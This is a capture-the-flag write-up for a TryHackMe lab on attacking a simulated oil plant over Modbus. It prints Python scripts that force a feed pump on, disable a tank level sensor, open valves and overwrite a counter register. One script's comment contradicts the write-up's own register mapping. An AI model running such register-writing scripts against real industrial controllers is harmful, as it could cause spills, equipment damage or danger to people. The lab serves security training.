# Attacking ICS Plant #2

## Introduction

Welcome to my another writeup! In this TryHackMe [Attacking ICS Plant #2](https://tryhackme.com/room/attackingics2) room, you'll learn how to attack ICS plant! Without further ado, let's dive in.

## Background

> Discover and attack ICS plants using modbus protocol (Modicon / Schneider Electric).

> Difficulty: Medium 

- Overall difficulty for me: Easy

## Task 1 - Discovery

The room [Attacking ICS Plant #1](https://tryhackme.com/room/attackingics1) is a prerequisite. You should complete it and download scripts from there. The same scripts can be used to complete this room.

Before attacking the plant, identify the following registries:

- open/close the feed pump (PLC_FEED_PUMP);
    
- tank level sensor (PLC_TANK_LEVEL);
    
- open/close the outlet valve (PLC_OUTLET_VALVE);
    
- open/close the separator vessel valve (PLC_SEP_VALVE);
    
- wasted oil counter (PLC_OIL_SPILL);
    
- processed oil counter (PLC_OIL_PROCESSED);
    
- open/close waste water valve (PLC_WASTE_VALVE).
    
VirtuaPlant can be downloaded from [GitHub](https://github.com/jseidl/virtuaplant/network/members).

## Task 2 - Flag #1

```
Let the oil overflow the tank for at least 60 seconds. Then connect and get the flag1: http://MACHINE_IP/flag1.txt.

Mind that the simulation should be reset before starting by pressing the ESC button. If the flag cannot be obtained, try to reset the room and start the attack again.
```

Let's download the scripts in [Attacking ICS Plant #1](https://tryhackme.com/room/attackingics1)!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# tar -xf scripts.tar.gz 
                                                                                                 
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# ls -lah
[...]
-rwxr-xr-x  1  501 staff  513 Sep  2  2020 attack_move_fill2.py
-rwxr-xr-x  1  501 staff  395 Sep  2  2020 attack_move_fill.py
-rwxr-xr-x  1  501 staff  511 Sep  2  2020 attack_shutdown2.py
-rwxr-xr-x  1  501 staff  397 Sep  2  2020 attack_shutdown.py
-rwxr-xr-x  1  501 staff  508 Sep  2  2020 attack_stop_fill2.py
-rwxr-xr-x  1  501 staff  394 Sep  2  2020 attack_stop_fill.py
-rwxr-xr-x  1  501 staff  335 Sep  2  2020 discovery.py
-rw-r--r--  1 nam  nam    701 Oct 10 21:43 scripts.tar.gz
-rwxr-xr-x  1  501 staff  327 Sep  2  2020 set_register.py
```

**VirtualPlant:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Attacking-ICS-Plant-2/images/a1.png)

Before we overflow the oil tank, **we must know which register is belong to which sensor.**

**To do so, I'll:**

- Run the `discovery.py` to observe all registries:

**discovery.py:**
```py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    rr = client.read_holding_registers(1, 16)
    print(rr.registers)
    time.sleep(1)
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# export RHOSTS=10.10.30.39

┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# python3 discovery.py $RHOSTS         
[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[...]
```

- Run `set_register.py` to modify one of the registies:

**set_register.py:**
```py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
register = int(sys.argv[2])
value = int(sys.argv[3])
client = ModbusClient(ip, port=502)
client.connect()

while True:
        client.write_register(register, value)
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# python3 set_register.py $RHOSTS 1 1
```

```
[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Attacking-ICS-Plant-2/images/a2.png)

Looks like the first register can turn on the `Feed Pump`! 

**When the oil reaches to the `Tank Level Sensor`, the `Feep Pump` will be turn off, and the `Outlet Valve` will be turn on.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Attacking-ICS-Plant-2/images/a3.png)

```
[...]
[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]
[...]
```

**Looks like the second register is the `Tank Level Sensor`! Let's turn that off!**

**To do so, I'll:**

- Create a new python script to turn on/off registries:

**attack_oil_overflow.py:**
```py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()

while True:
  client.write_register(1, 1)  # Open Feed Pump
  client.write_register(2, 0)  # Turn off Tank Level Sensor
```

- Run the script:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# python3 attack_oil_overflow.py $RHOSTS
```

- Let that run for 60 seconds:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Attacking-ICS-Plant-2/images/a4.png)

- Get the flag!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# curl http://$RHOSTS/flag1.txt
{Redacted}
```

## Task 3 - Flag #2

```
Let the oil flow through the waste water valve only. Wait until the counter reaches 2000. Then connect and get the flag2: [http://MACHINE_IP/flag2.txt.

Mind that the simulation should be reset before starting by pressing the ESC button. If the flag cannot be obtained, try to reset the room and start the attack again.
```

**Now, we know the `Feed Pump` and `Tank Level Sensor` is using which register, but we don't know the rest.**

**To figure out the `Outlet Valve`, `Separator Vessel Valve` and `Waste Water Valve`, I'll:**

- Find the `Outlet Valve` register:

According to my observation, it seems like the **third one is the `Outlet Valve` register (0 = stop, 1 = open),** the **sixth one is the `Separator Vessel Valve` register(0 = open, 1 = close)**, the **seventh one is the amount of drops that went through the `Waste Water Valve`.**

**Armed with this information, we can obtain the flag in 2 ways:**

### 1. Easier way

- Set the seventh register to > 2000:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# python3 set_register.py $RHOSTS 7 2001
```

- Get the flag!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# curl http://$RHOSTS/flag2.txt
{Redacted}
```

### 2. Hard way

- Set the first, third, seventh register to 1, the second register set to 0:

```py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(1, 1)  # Open Feed Pump
  client.write_register(2, 0)  # Turn off Tank Level Sensor
  client.write_register(3, 1)  # Open Outlet Valve
  client.write_register(7, 1)  # Close Seperator Vessel Valve
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# python3 attack_waste_water.py $RHOSTS
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Attacking-ICS-Plant-2/images/a5.png)

- Wait the seventh register to bigger than 2000:

```
[1, 0, 1, 1, 1, 1, 2001, 1, 0, 0, 0, 0, 0, 0, 0, 0]
```

- Get the flag!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Attacking-ICS-Plant-#2]
└─# curl http://$RHOSTS/flag2.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Attacking ICS Plant